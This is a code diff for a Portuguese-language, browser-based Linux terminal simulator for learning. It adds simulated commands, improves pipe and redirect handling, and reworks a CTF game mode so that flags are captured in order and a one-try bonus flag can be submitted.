-  if (!args.length) { print('sudo: informe um comando','error'); return; }
-  if (args[0]==='apt') { cmdApt(flags, args.slice(1)); return; }
-  if (args[0]==='cat') { cmdCat(flags, args.slice(1)); return; }
+  if (!args.length) { print('sudo: informe um comando','error'); return false; }
+  if (args[0]==='apt') { cmdApt(flags, args.slice(1)); return true; }
+  if (args[0]==='ls') { return cmdLs(flags, args.slice(1), true); }
+  if (args[0]==='cat') { return cmdCat(flags, args.slice(1), true); }
   print(`[sudo] simulando execucao de: ${escapeHtml(args.join(' '))}`,'warning');
+  return true;
 }
 function cmdApt(flags, args) {
   const sub = args[0];
@@ -770,9 +923,15 @@ function cmdCurl(flags, args) {
 }
 function cmdPing(flags, args) {
   if (!args.length) { print('ping: informe um host','error'); return; }
-  const cnt = flags.includes('-c') ? parseInt(args[args.indexOf('-c')+1])||4 : 4;
-  print(`PING ${args[0]} (93.184.216.34) 56(84) bytes de dados.`,'output');
-  for (let i=0;i<Math.min(cnt,4);i++) print(`64 bytes de ${args[0]}: icmp_seq=${i+1} ttl=55 time=${(20+Math.random()*30).toFixed(3)} ms`,'output');
+  let cnt = 4;
+  let host = args[0];
+  if (flags.includes('-c') && /^\d+$/.test(args[0] || '')) {
+    cnt = parseInt(args[0], 10);
+    host = args[1];
+  }
+  if (!host) { print('ping: informe um host','error'); return; }
+  print(`PING ${host} (93.184.216.34) 56(84) bytes de dados.`,'output');
+  for (let i=0;i<Math.min(cnt,4);i++) print(`64 bytes de ${host}: icmp_seq=${i+1} ttl=55 time=${(20+Math.random()*30).toFixed(3)} ms`,'output');
   print(`${cnt} pacotes transmitidos, ${cnt} recebidos, 0% perda`,'success');
 }
 function cmdIfconfig() {
@@ -782,6 +941,24 @@ function cmdIfconfig() {
   printBlank();
   print('lo: flags=73  mtu 65536','output');
   print('        inet 127.0.0.1  netmask 255.0.0.0','info');
+}
+
+function cmdIp(args) {
+  const sub = args[0] || 'addr';
+  if (sub === 'addr' || sub === 'a') {
+    print('1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 state UNKNOWN', 'output');
+    print('    inet 127.0.0.1/8 scope host lo', 'info');
+    print('2: eth0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 state UP', 'output');
+    print('    inet 192.168.1.100/24 brd 192.168.1.255 scope global eth0', 'info');
+  } else if (sub === 'route' || sub === 'r') {
+    print('default via 192.168.1.1 dev eth0 proto dhcp', 'output');
+    print('192.168.1.0/24 dev eth0 proto kernel scope link src 192.168.1.100', 'output');
+  } else if (sub === 'link' || sub === 'l') {
+    print('1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 state UNKNOWN mode DEFAULT', 'output');
+    print('2: eth0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 state UP mode DEFAULT', 'output');
+  } else {
+    print('ip: uso: ip [addr|route|link]', 'output');
+  }
 }
 
 // ══════════════════════════════════════════════════════
@@ -810,6 +987,47 @@ function injectCTFFilesystem() {
   }};
 }
 
+function resetVirtualFilesystem() {
+  FS['/'] = cloneNode(BASE_FS['/']);
+  state.cwd = state.env.HOME;
+  state.prevDir = null;
+  updatePrompt();
+}
+
+const CTF_ORDER = ['flag1','flag2','flag3','flag4','flag5','flag6','flag7','flag8','flag9','flag10'];
+
+function nextCTFKey() {
+  return CTF_ORDER.find(key => !CTF.flags[key].found) || null;
+}
+
+function canCaptureCTFKey(key) {
+  return !CTF.active || key === nextCTFKey();
+}
+
+function warnCTFOutOfOrder(key) {
+  const next = nextCTFKey();
+  if (!next || key === next) return;
+  print(`CTF: esta evidencia pertence a uma etapa futura. Complete primeiro: ${CTF.flags[next].label}.`, 'warning');
+}
+
+function flagKeyInText(text) {
+  const found = Object.entries(CTF.flagStrings).find(([flagStr]) => String(text).includes(flagStr));
+  return found ? found[1] : null;
+}
+
+function canRevealCTFNode(node, path) {
+  if (!CTF.active || !node || node.type !== 'file') return true;
+  const key = flagKeyInText(node.content || '');
+  if (!key || CTF.flags[key].found) return true;
+  if (key === 'flag2') {
+    print('CTF: esta evidencia precisa ser movida para /tmp/analise com mv para concluir esta etapa.', 'warning');
+    return false;
+  }
+  if (canCaptureCTFKey(key)) return true;
+  warnCTFOutOfOrder(key);
+  return false;
+}
+
 // Detecta cp (flag1) e mv (flag2) no CTF
 function checkCTFMvCp(cmd, args) {
   if (!CTF.active) return;
@@ -818,6 +1036,7 @@ function checkCTFMvCp(cmd, args) {
     const src = resolvePath(state.cwd, args[0] || '');
     const dst = resolvePath(state.cwd, args[1] || '');
     if (src.includes('notas_hacker') && dst.includes('/tmp/')) {
+      if (!canCaptureCTFKey('flag1')) { warnCTFOutOfOrder('flag1'); return; }
       setTimeout(() => {
         printBlank();
         print('Relatorio copiado com sucesso! Evidencia original preservada.', 'success');
@@ -834,7 +1053,8 @@ function checkCTFMvCp(cmd, args) {
   if (cmd === 'mv' && !CTF.flags.flag2.found) {
     const src = resolvePath(state.cwd, args[0] || '');
     const dst = resolvePath(state.cwd, args[1] || '');
-    if (src.includes('config.enc') && dst.includes('/tmp/')) {
+    if (src.includes('config.enc') && (dst === '/tmp/analise' || dst.startsWith('/tmp/analise/'))) {
+      if (!canCaptureCTFKey('flag2')) { warnCTFOutOfOrder('flag2'); return; }
       setTimeout(() => {
         printBlank();
         print('Evidencia movida com sucesso para analise forense!', 'success');
@@ -852,6 +1072,7 @@ function checkCTFMvCp(cmd, args) {
 function checkFlagInText(text) {
   for (const [flagStr, key] of Object.entries(CTF.flagStrings)) {
     if (text.includes(flagStr) && !CTF.flags[key].found) {
+      if (!canCaptureCTFKey(key)) { warnCTFOutOfOrder(key); return; }
       setTimeout(() => captureFlag(key), 200);
     }
   }
@@ -859,6 +1080,7 @@ function checkFlagInText(text) {
 
 function captureFlag(key) {
   if (!CTF.flags[key] || CTF.flags[key].found) return;
+  if (!canCaptureCTFKey(key)) { warnCTFOutOfOrder(key); return; }
   CTF.flags[key].found = true;
   CTF.score += CTF.flags[key].pts;
   updateCTFHUD();
@@ -872,7 +1094,7 @@ function captureFlag(key) {
     printBlank();
     // Exibe o status automaticamente para o usuario acompanhar o progresso
     printCTFStatus();
-    const rem = Object.values(CTF.flags).filter(f=>!f.found).length;
+    const rem = CTF_ORDER.filter(key => !CTF.flags[key].found).length;
     if (rem === 0) { setTimeout(showCTFVictory, 1500); }
     else print(`<span class="output-dim">Continue explorando! Use ctf hint se precisar de ajuda.</span>`,'output-dim');
     printBlank();
@@ -891,7 +1113,7 @@ function updateCTFHUD() {
   document.getElementById('ctf-score-display').textContent = `${CTF.score} pts`;
   const row = document.getElementById('ctf-flags-row');
   row.innerHTML = '';
-  Object.entries(CTF.flags).forEach(([,f]) => {
+  Object.entries(CTF.flags).filter(([,f]) => !f.bonus).forEach(([,f]) => {
     const badge = document.createElement('span');
     badge.className = 'ctf-flag-badge' + (f.found?' found':'');
     badge.innerHTML = `<span class="flag-icon">${f.found?'🚩':'⬜'}</span>${escapeHtml(f.label)}`;
@@ -901,16 +1123,102 @@ function updateCTFHUD() {
 
 function showCTFVictory() {
   const elapsed = Math.round((Date.now()-CTF.startTime)/1000);
-  document.getElementById('victory-score').textContent = `Pontuacao Final: ${CTF.score} pts`;
+  const victory = document.getElementById('ctf-victory');
+  const scoreEl = document.getElementById('victory-score');
+  scoreEl.textContent = `Pontuacao Final: ${CTF.score} pts`;
+  scoreEl.classList.remove('score-boost');
   document.getElementById('victory-time').textContent  = `Tempo: ${Math.floor(elapsed/60)}m ${elapsed%60}s | Dicas: ${CTF.hintsUsed}`;
-  document.getElementById('ctf-victory').classList.add('show');
+  document.getElementById('bonus-flag-input').value = '';
+  document.getElementById('bonus-flag-input').disabled = CTF.bonusAttempted || !!CTF.flags.flag11.found;
+  document.getElementById('bonus-flag-submit').disabled = CTF.bonusAttempted || !!CTF.flags.flag11.found;
+  document.getElementById('bonus-flag-message').textContent = '';
+  document.getElementById('bonus-flag-panel').classList.toggle('solved', !!CTF.flags.flag11.found);
+  document.getElementById('bonus-flag-panel').classList.toggle('attempted', CTF.bonusAttempted);
+  victory.classList.remove('glitching', 'bonus-unlocked');
+  victory.classList.add('show');
+  if (!CTF.bonusAttempted && !CTF.flags.flag11.found) {
+    setTimeout(() => document.getElementById('bonus-flag-input').focus(), 100);
+  }
+}
+
+function cipherBonusText(text) {
+  const alphabet = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789{}_';
+  return String(text).split('').map((ch, i) => {
+    if (ch === ' ') return ' ';
+    return alphabet[(ch.charCodeAt(0) + i * 7) % alphabet.length];
+  }).join('');
+}
+
+function animateCipherInput(input, original, onDone) {
+  const encrypted = cipherBonusText(original || ' ');
+  const frames = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789{}_#@$%';
+  let index = 0;
+  input.classList.add('ciphering');
+  const tick = setInterval(() => {
+    const chars = encrypted.split('');
+    for (let i = index; i < chars.length; i++) {
+      chars[i] = frames[(Date.now() + i * 13) % frames.length];
+    }
+    input.value = chars.join('');
+    index++;
+    if (index > encrypted.length) {
+      clearInterval(tick);
+      input.value = encrypted;
+      input.classList.remove('ciphering');
+      onDone?.();
+    }
+  }, 55);
+}
+
+function submitBonusFlag() {
+  const input = document.getElementById('bonus-flag-input');
+  const msg = document.getElementById('bonus-flag-message');
+  const victory = document.getElementById('ctf-victory');
+  const value = input.value.trim();
+  const submit = document.getElementById('bonus-flag-submit');
+  if (CTF.bonusAttempted || CTF.flags.flag11.found) {
+    msg.textContent = CTF.flags.flag11.found ? 'Flag bonus ja validada.' : 'Tentativa bonus ja utilizada.';
+    return;
+  }
+  if (!value) {
+    msg.textContent = 'Digite uma flag antes de validar. Esta tentativa e unica.';
+    return;
+  }
+
+  CTF.bonusAttempted = true;
+  input.disabled = true;
+  submit.disabled = true;
+  document.getElementById('bonus-flag-panel').classList.add('attempted');
+  msg.textContent = 'Cifrando tentativa...';
+
+  animateCipherInput(input, value, () => {
+    if (value !== 'FLAG{Y0U_5H0ULD_N0T_B3_H3R3}') {
+      msg.textContent = 'Tentativa utilizada. A flag informada foi cifrada e arquivada.';
+      return;
+    }
+
+    CTF.flags.flag11.found = true;
+    CTF.score += CTF.flags.flag11.pts;
+    updateCTFHUD();
+    const scoreEl = document.getElementById('victory-score');
+    scoreEl.textContent = `Pontuacao Final: ${CTF.score} pts`;
+    scoreEl.classList.add('score-boost');
+    msg.innerHTML = '<span class="bonus-points-pop">+500 pts</span><span>Você certamente está em um nível mais avançado...</span>';
+    victory.classList.add('glitching');
+    setTimeout(() => {
+      victory.classList.remove('glitching');
+      victory.classList.add('bonus-unlocked');
+      document.getElementById('bonus-flag-panel').classList.add('solved');
+      scoreEl.classList.remove('score-boost');
+    }, 1300);
+  });
 }
 
 // ══════════════════════════════════════════════════════
 // DICAS CTF — formato estruturado
 // ══════════════════════════════════════════════════════
 function giveCTFHint() {
-  const entry = Object.entries(CTF.flags).find(([,f]) => !f.found);
+  const entry = Object.entries(CTF.flags).find(([,f]) => !f.found && !f.bonus);
   if (!entry) { print('Todas as flags ja foram encontradas!', 'success'); return; }
   const [key, f] = entry;
   CTF.hintsUsed++;
@@ -965,7 +1273,9 @@ function giveCTFHint() {
 
 function startCTF() {
   CTF.active = true; CTF.score = 0; CTF.startTime = Date.now(); CTF.hintsUsed = 0;
+  CTF.bonusAttempted = false;
   Object.values(CTF.flags).forEach(f => f.found = false);
+  resetVirtualFilesystem();
   injectCTFFilesystem();
   document.getElementById('ctf-hud').classList.add('active');
   updateCTFHUD();
@@ -1023,9 +1333,10 @@ function stopCTF(silent) {
   if (!silent) {
     printBlank();
     print('Modo jogo encerrado.','warning');
-    print(`Pontuacao: <span class="hl-cmd">${CTF.score} pts</span> | Flags: ${Object.values(CTF.flags).filter(f=>f.found).length}/10`,'output');
+    print(`Pontuacao: <span class="hl-cmd">${CTF.score} pts</span> | Flags: ${CTF_ORDER.filter(key=>CTF.flags[key].found).length}/10`,'output');
     printBlank();
   }
+  resetVirtualFilesystem();
 }
 
 function printCTFStatus() {
@@ -1034,12 +1345,13 @@ function printCTFStatus() {
   print('============== STATUS DA MISSAO ==============','separator');
   print(`Tempo: <span class="hl-value">${Math.floor(elapsed/60)}m ${elapsed%60}s</span>  |  Score: <span class="hl-cmd">${CTF.score} pts</span>  |  Dicas: ${CTF.hintsUsed}`,'output');
   printBlank();
-  Object.entries(CTF.flags).forEach(([,f],i)=>{
+  CTF_ORDER.forEach((key,i)=>{
+    const f = CTF.flags[key];
     const icon = f.found ? '[X]' : '[ ]';
     const status = f.found ? '<span style="color:var(--green)">CAPTURADA</span>' : '<span style="color:var(--gray)">pendente</span>';
     print(`  ${icon} Flag ${i+1}: <span class="hl-value">${escapeHtml(f.label).padEnd(18)}</span> ${status}  [${f.found?'+'+f.pts:f.pts+' pts'}]`,'output');
   });
-  const found = Object.values(CTF.flags).filter(f=>f.found).length;
+  const found = CTF_ORDER.filter(key=>CTF.flags[key].found).length;
   printBlank();
   print(`Progresso: [<span class="hl-cmd">${'#'.repeat(found)}${'.'.repeat(10-found)}</span>] ${found}/10`,'output');
   print('=============================================','separator');
@@ -1074,31 +1386,80 @@ function cmdCtf(args) {
 // ══════════════════════════════════════════════════════
 // PIPE E REDIRECT
 // ══════════════════════════════════════════════════════
-function handlePipe(input) {
-  const parts = input.split(' | ');
-  const last = parseCommand(parts[parts.length-1]);
-  const first = parseCommand(parts[0]);
-  if (last.cmd==='wc' && last.flags.includes('-l')) {
-    if (first.cmd==='ls') { const d=listDir(state.cwd); print(String(d?d.length:0),'output'); }
-    else executeCommand(parts[0]);
-  } else if (last.cmd==='grep' && last.args[0]) {
-    const rx = new RegExp(last.args[0],'i');
-    if (first.cmd==='ls'||first.cmd==='ll') (listDir(state.cwd)||[]).filter(e=>rx.test(e.name)).forEach(e=>print(e.name+(e.type==='dir'?'/':''),'output'));
-    else { executeCommand(parts[0]); }
-  } else {
-    parts.forEach((p,i) => { if (i < parts.length-1) executeCommand(p); });
-    executeCommand(parts[parts.length-1]);
+function collectCommandOutput(input, stdin) {
+  const { cmd, flags, args, raw } = parseCommand(input);
+  if (cmd === 'echo') return args.map(a => a.replace(/\$(\w+)/g, (_, v) => state.env[v] || '')).join(' ');
+  if (cmd === 'pwd') return state.cwd;
+  if (cmd === 'ls' || cmd === 'll' || cmd === 'la') {
+    const listFlags = cmd === 'll' ? ['-la'] : cmd === 'la' ? ['-a'] : flags;
+    const showAll = listFlags.some(f => f.includes('a'));
+    const path = args[0] ? resolvePath(state.cwd, args[0]) : state.cwd;
+    if (path.startsWith('/root')) return null;
+    const dir = listDir(path);
+    if (!dir) return null;
+    return dir.filter(e => showAll || !e.name.startsWith('.')).map(e => e.name + (e.type === 'dir' ? '/' : '')).join('\n');
   }
+  if (cmd === 'cat') {
+    const chunks = [];
+    for (const arg of args) {
+      const path = resolvePath(state.cwd, arg);
+      const node = getNode(path);
+      if (!node || node.type === 'dir' || (path.startsWith('/root')) || !canRevealCTFNode(node, path)) return null;
+      chunks.push(node.content);
+    }
+    return chunks.join('\n');
+  }
+  if (cmd === 'grep') {
+    const pattern = args[0];
+    if (!pattern || stdin == null) return null;
+    const ci = flags.includes('-i');
+    const invert = flags.includes('-v');
+    const countOnly = flags.includes('-c');
+    let rx;
+    try { rx = new RegExp(pattern, ci ? 'i' : ''); } catch { return null; }
+    const lines = String(stdin).split('\n').filter(line => invert ? !rx.test(line) : rx.test(line));
+    return countOnly ? String(lines.length) : lines.join('\n');
+  }
+  if (cmd === 'wc') {
+    const text = stdin == null ? '' : String(stdin);
+    if (flags.includes('-l')) return String(text ? text.split('\n').filter(Boolean).length : 0);
+    if (flags.includes('-w')) return String(text.trim() ? text.trim().split(/\s+/).length : 0);
+    if (flags.includes('-c')) return String(new Blob([text]).size);
+    const lines = text ? text.split('\n').filter(Boolean).length : 0;
+    const words = text.trim() ? text.trim().split(/\s+/).length : 0;
+    return `${String(lines).padStart(7)} ${String(words).padStart(7)} ${String(new Blob([text]).size).padStart(7)}`;
+  }
+  if (cmd === 'head') {
+    const n = parseInt(optionValue(raw, '-n', '10'), 10) || 10;
+    return stdin == null ? null : String(stdin).split('\n').slice(0, n).join('\n');
+  }
+  if (cmd === 'tail') {
+    const n = parseInt(optionValue(raw, '-n', '10'), 10) || 10;
+    return stdin == null ? null : String(stdin).split('\n').slice(-n).join('\n');
+  }
+  return null;
+}
+
+function handlePipe(input) {
+  const parts = input.split(' | ').map(s => s.trim()).filter(Boolean);
+  let output = collectCommandOutput(parts[0], null);
+  if (output == null) { print('pipe: comando inicial nao suportado nesta simulacao', 'error'); return; }
+  for (let i = 1; i < parts.length; i++) {
+    output = collectCommandOutput(parts[i], output);
+    if (output == null) { print(`pipe: comando '${parts[i]}' nao suportado nesta simulacao`, 'error'); return; }
+  }
+  String(output).split('\n').forEach(line => print(escapeHtml(line), 'output'));
 }
 
 function handleRedirect(input) {
   const append = input.includes('>>');
   const [left, right] = input.split(append?'>>':'>').map(s=>s.trim());
   const { parent, name } = getParentAndNode(resolvePath(state.cwd, right));
-  if (!parent) { print(`bash: ${right}: Diretorio nao encontrado`,'error'); return; }
-  const { cmd, args } = parseCommand(left);
-  let captured = cmd==='echo' ? args.map(a=>a.replace(/\$(\w+)/g,(_,v)=>state.env[v]||'')).join(' ')
-    : cmd==='ls' ? (listDir(state.cwd)||[]).map(e=>e.name).join('\n') : `(saida de: ${left})`;
+  if (!parent || parent.type !== 'dir') { print(`bash: ${right}: Diretorio nao encontrado`,'error'); return; }
+  const captured = left.includes(' | ')
+    ? left.split(' | ').map(s => s.trim()).filter(Boolean).reduce((out, part, idx) => idx === 0 ? collectCommandOutput(part, null) : collectCommandOutput(part, out), null)
+    : collectCommandOutput(left, null);
+  if (captured == null) { print(`bash: nao foi possivel redirecionar a saida de '${left}'`, 'error'); return; }
   if (append && parent.children[name]) parent.children[name].content += '\n'+captured;
   else parent.children[name] = { type:'file', content:captured };
   print(`<span class="output-dim">Saida gravada em '${right}'</span>`,'output-dim');
@@ -1139,29 +1500,31 @@ function executeCommand(input) {
   if (trimmed.includes('>'))    { handleRedirect(trimmed); return; }
   const { cmd, flags, args, raw } = parseCommand(trimmed);
   switch (cmd) {
-    case 'ls':       cmdLs(flags,args);       break;
+    case 'ls':       cmdLs(flags,args,false); break;
     case 'cd':       cmdCd(args);             break;
     case 'pwd':      cmdPwd();                break;
     case 'mkdir':    cmdMkdir(flags,args);    break;
     case 'rm':       cmdRm(flags,args);       break;
-    case 'cp':       cmdCp(flags,args); checkCTFMvCp('cp',args); break;
-    case 'mv':       cmdMv(flags,args); checkCTFMvCp('mv',args); break;
+    case 'cp':       if (cmdCp(flags,args)) checkCTFMvCp('cp',args); break;
+    case 'mv':       if (cmdMv(flags,args)) checkCTFMvCp('mv',args); break;
     case 'touch':    cmdTouch(args);          break;
-    case 'cat':      cmdCat(flags,args);      break;
+    case 'file':     cmdFile(args);           break;
+    case 'cat':      cmdCat(flags,args,false); break;
     case 'echo':     cmdEcho(flags,args);     break;
     case 'grep':     cmdGrep(flags,args);     break;
     case 'find':     cmdFind(flags,raw);      break;
+    case 'which':    cmdWhich(args);          break;
     case 'chmod':    cmdChmod(args);          break;
     case 'chown':    cmdChown(args);          break;
-    case 'ps':       cmdPs(flags);            break;
+    case 'ps':       cmdPs(flags,args);       break;
     case 'kill':     cmdKill(flags,args);     break;
     case 'top':      cmdTop();                break;
     case 'df':       cmdDf(flags);            break;
     case 'du':       cmdDu(flags,args);       break;
     case 'free':     cmdFree(flags);          break;
     case 'tar':      cmdTar(flags,args);      break;
-    case 'head':     cmdHead(flags,args);     break;
-    case 'tail':     cmdTail(flags,args);     break;
+    case 'head':     cmdHead(flags,args,raw); break;
+    case 'tail':     cmdTail(flags,args,raw); break;
     case 'sort':     cmdSort(flags,args);     break;
     case 'wc':       cmdWc(flags,args);       break;
     case 'less':     cmdLess(args);           break;
@@ -1175,16 +1538,19 @@ function executeCommand(input) {
     case 'curl':     cmdCurl(flags,args);     break;
     case 'ping':     cmdPing(flags,args);     break;
     case 'ifconfig': cmdIfconfig();           break;
-    case 'ip':       cmdIfconfig();           break;
+    case 'ip':       cmdIp(args);             break;
     case 'env':      cmdEnv();                break;
     case 'whoami':   cmdWhoami();             break;
+    case 'id':       cmdId(args);             break;
+    case 'hostname': cmdHostname(flags);      break;
+    case 'uptime':   cmdUptime();             break;
     case 'uname':    cmdUname(flags);         break;
     case 'date':     cmdDate(raw);            break;
     case 'help':     cmdHelp(args);           break;
     case 'clear':    clearTerminal();         break;
     case 'ctf':      cmdCtf(args);            break;
-    case 'll':       cmdLs(['-la'],args);     break;
-    case 'la':       cmdLs(['-a'],args);      break;
+    case 'll':       cmdLs(['-la'],args,false); break;
+    case 'la':       cmdLs(['-a'],args,false); break;
     case 'exit':
       print('Saindo do terminal...','output-dim');
       print('<span class="output-dim">Recarregue a pagina para uma nova sessao.</span>','output');
@@ -1341,6 +1707,13 @@ document.getElementById('ctf-hint-btn').addEventListener('click', () => {
   if (CTF.active) giveCTFHint();
   inputEl.focus();
 });
+document.getElementById('bonus-flag-submit').addEventListener('click', submitBonusFlag);
+document.getElementById('bonus-flag-input').addEventListener('keydown', e => {
+  if (e.key === 'Enter') {
+    e.preventDefault();
+    submitBonusFlag();
+  }
+});
 document.getElementById('victory-restart').addEventListener('click', () => {
   document.getElementById('ctf-victory').classList.remove('show');
   stopCTF(true);
@@ -1433,7 +1806,7 @@ function bootMessage() {
     '<span class="hl-flag">|  </span><span class="hl-cmd">LINUX TERMINAL</span><span class="output-dim"> -- Ambiente de Aprendizado Interativo</span><span class="hl-flag">  |</span>',
     '<span class="hl-flag">+========================================================+</span>',
     '',
-    '<span class="output-dim">  Digite </span><span class="hl-cmd">help</span><span class="output-dim"> para ver os 30+ comandos disponiveis</span>',
+    '<span class="output-dim">  Digite </span><span class="hl-cmd">help</span><span class="output-dim"> para ver os 50 comandos disponiveis</span>',
     isMobile
       ? '<span class="output-dim">  Toque no </span><span class="hl-cmd">menu (=)</span><span class="output-dim"> no canto superior esquerdo para abrir o guia</span>'
       : '<span class="output-dim">  Clique em um comando no menu lateral para inserir exemplos</span>',
